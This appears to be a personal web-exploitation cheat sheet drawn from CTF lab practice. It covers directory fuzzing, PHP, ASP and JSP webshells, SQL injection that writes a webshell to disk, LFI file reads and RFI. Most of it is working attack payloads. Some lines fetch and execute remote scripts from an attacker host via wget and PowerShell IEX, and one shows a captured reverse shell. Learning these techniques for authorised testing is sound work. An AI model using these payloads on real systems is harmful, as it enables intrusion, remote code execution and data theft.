# Web exploitation

## Enumerating Web dirs.

1. URLs are case-sensitive for Linux webservers but not Windows. [Ref](https://webmasters.stackexchange.com/questions/90339/why-are-urls-case-sensitive)

### wfuzz exclude specified response length
```text
root@kali:~/CTF/HTB/Bart# wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.81/FUZZ -H "Host: bart.htb" --hc 400 --hh 0,150693
 /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.81/FUZZ
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000067:   301        1 L      10 W       145 Ch      "forum"
000001515:   301        1 L      10 W       147 Ch      "monitor"

Total time: 0
Processed Requests: 207643
Filtered Requests: 207641
Requests/sec.: 0
```

To use wfuzz instead of gobuster to search for both dirs and files excluding a specific response length, first edit the non-entries in the fuzzing list. Then have another list of file extensions to search. You need to fuzz twice, one for the files the other for dirs. Check the typical response length with wfuzz first.

```text
# For files
root@kali:~/CTF/PGPractice/Peppo# cat exts
.php
.txt
.md
.html
.htm
.conf
.bak
.sh
.pl
.cgi

wfuzz -c -w directory-list-2.3-medium.txt -w exts -u http://192.168.217.60:10000/FUZZFUZ2Z --hh 12

# For dirs
wfuzz -c -w directory-list-2.3-medium.txt -u http://192.168.217.60:10000/FUZZ --hh 12
```

## GET to POST

Some API endpoints require POST instead of GET. Note that POST requires two parameters

1. Content-Type
2. Content-Length

The former can be

1. text/html; charset=UTF-8
2. application/x-www-form-urlencoded

and parameters sent in the HTTP body would be

**data=test1&login=true**

Use Burp's change request method if unsure.

## PHP webshell

```php
<?php system($_REQUEST ['cmd']); ?>
```

Or consider adding a simple echo to make sure system() isn't blocked

```php
<?php echo Test; system($_REQUEST ['cmd']); ?>
```

A stripped down PHP webshell would be

```php
<?=`whoami`?>
```

Or alternatively, have it download a file to directory served by the Webserver

```php
# Linux
<?php exec("wget http://10.10.14.78/shell.php -O /var/www/html/shell.php"); ?>
# Windows
<?php exec("powershell.exe IEX(IWR http://10.10.14.78/rshell.ps1 -UseBasicParsing)"); ?>
```
## ASP webshell

Start with simple ones like this asp one or [this](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp) (worked for Conceal)

```asp
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd/c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

Look for [webshells here](https://github.com/tennc/webshell).

## WAR webshell

This might work if the msfvenom java/jsp_shell_reverse_tcp payload doesn.t Always remember when there is a Web reverse shell, there's always a [simple Webshell alternative](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/).

```jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

Save as index.jsp in a dir named webshell/

```bash
mkdir webshell
cp index.jsp webshell/
cd webshell
jar -cvf ../webshell.war *
```

Upload webshell.war and run it.

## Web API

1. base64-decode cookies to see if you can replace them with uid 1 or 0 or admin to get admin access.

## Downloading image files

`wget`, unlike Firefox doesn't strip out metadata from image files. So this preserves some additional `exiftool` data like file modified dates.

## Virtual host config

1. When you have `Assign User-ID` in vhost config and a shell, can upload a Webshell to achieve RCE under a different user, see OpenAdmin for eg.

## SQL Injection

Can try
```plaintext
?cod=1+2
```
to see if SQL actually evaluates the math to load `?cod=3`

### group_concat

Can group output with group_concat with 
`group_concat(TABLE_NAME,":",COLUMN_NAME,)`
to show

```
db:User
db:Host
```

### LOAD_FILE() LFI

May want to wrap `LOAD_FILE()` with `TO_base64(LOAD_FILE("/etc/passwd"))` so that it it converts everything to base64 instead of trying to display it which may execute code and prevent displaying.

Consider LFI to view PHP code containing MySQL password in plaintext instead of 
```sql
SELECT user FROM mysql.user;
```
which requires the Web app user be sufficiently privileged to query that.

### Write shell into file
Using `OUTFILE()`
```text
productName=999' UNION ALL SELECT "<?php system($_REQUEST ['cmd']); ?>",null,null,null,null,null INTO OUTFILE "C:/inetpub/wwwroot/webshell.php";-- -
```
Or `DUMPFILE()` which has fewer bad chars
```text
productName=999' UNION ALL SELECT "<?php system($_REQUEST ['cmd']); ?>",null,null,null,null,null INTO DUMPFILE "C:/inetpub/wwwroot/webshell.php";-- -
```

## PHP

### PHP restrictions

`phpinfo()` let's you see which PHP functions are disabled. You may be able to find ways to bypass them by Googling "bypass PHP disable functions". To test whether PHP RCE is possible you may want to do a simple `echo` instead of `system()` or `exec()` because those could be blocked while most others work.

```php
<?php echo("Testing"); ?>
```

## RFI

Get shell with webshell using RFI without php reverse shell

```text
GET /site/index.php?page=http://192.168.49.242/webshell.php&cmd=powershell.exe IEX(IWR http://192.168.49.242/rshell.ps1 -UseBasicParsing) HTTP/1.1
```

See

```text
192.168.242.53 - - [25/May/2021 18:58:14] "GET /webshell.php HTTP/1.0" 200 -
192.168.242.53 - - [25/May/2021 18:58:35] "GET /rshell.ps1 HTTP/1.1" 200 -
```

```text
root@kali:~/CTF/Box# rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.49.242] from (UNKNOWN) [192.168.242.53] 49979
Windows PowerShell running as user user on BOX
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\site>
```

## LFI

#### Linux

1. **/proc/self/status**  - See UID/GID of Web user,

2. **/proc/self/environ**  - View `env`

3. **/etc/os-release** - Check distro

Also see if you can view **/var/log/apache2/error.log** or **/var/log/apache2/access.log** for log poisoning eg. HTB Poison.

#### Windows

Typically check

1.  C:\Windows\win.ini 
2. C:\WINDOWS\System32\drivers\etc\hosts

You may be able to get RCE for LFI [like this](https://book.hacktricks.xyz/pentesting-web/file-inclusion#wrapper-input)

```text
GET /LFI.php?page=php://input HTTP/1.1
Host: 192.168.1.110
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.11.1.35/frame_b.htm
Upgrade-Insecure-Requests: 1
Content-Length: 35

POST DATA: <?php passthru("id"); ?>

HTTP/1.1 200 OK
Date: Wed, 19 May 2021 06:28:25 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Content-Length: 59
Connection: close
Content-Type: text/html; charset=UTF-8

POST DATA: uid=48(apache) gid=48(apache) groups=48(apache)
```

